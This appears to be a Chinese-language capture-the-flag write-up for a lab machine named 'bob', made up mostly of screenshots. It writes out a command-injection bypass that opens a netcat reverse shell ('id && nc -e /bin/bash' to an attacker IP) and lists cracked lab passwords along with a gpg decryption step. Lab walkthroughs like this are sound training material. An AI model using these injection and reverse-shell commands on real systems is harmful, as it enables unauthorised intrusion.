# bob

![image-20200619064614371](assets/bob.assets/image-20200619064614371.png)

![image-20200619064801608](assets/bob.assets/image-20200619064801608.png)



![image-20200619071632161](assets/bob.assets/image-20200619071632161.png)



![image-20200619073444169](assets/bob.assets/image-20200619073444169.png)

![image-20200619073622557](assets/bob.assets/image-20200619073622557.png)

直接nc回弹shell会被过滤掉，试一试用命令连接

```bash
id || nc -e /bin/bash 10.10.10.128 1337		#失败
id && nc -e /bin/bash 10.10.10.128 1337		#成功
```

![image-20200619081420128](assets/bob.assets/image-20200619081420128.png)

home下有4个用户，bob目录下有隐藏的旧密码文件

![image-20200619083020352](assets/bob.assets/image-20200619083020352.png)

```bash
jc:Qwerty
seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
```

![image-20200619083557481](assets/bob.assets/image-20200619083557481.png)

```bash
elliot:theadminisdumb
```

![image-20200619084327709](assets/bob.assets/image-20200619084327709.png)

secret挖到最后

![image-20200619084614096](assets/bob.assets/image-20200619084614096.png)

回到之前的文档目录

![image-20200619084829225](assets/bob.assets/image-20200619084829225.png)

看来只剩下login.txt.gpg文件了，这是个加密的txt文件

做了一些枚举，仍没发现有用的线索。

仔细回看之前得到的信息发现

![image-20200619085618690](assets/bob.assets/image-20200619085618690.png)

```bash
HARPOCRATES

```

![image-20200619090613529](assets/bob.assets/image-20200619090613529.png)

使用nc传回kali，

尝试用之前的密码解密

```bash
gpg --batch --passphrase HARPOCRATES -d login.txt.gpg
```



![image-20200619091300916](assets/bob.assets/image-20200619091300916.png)

```bash
bob:b0bcat_
```

![image-20200619091820165](assets/bob.assets/image-20200619091820165.png)

![image-20200619091913730](assets/bob.assets/image-20200619091913730.png)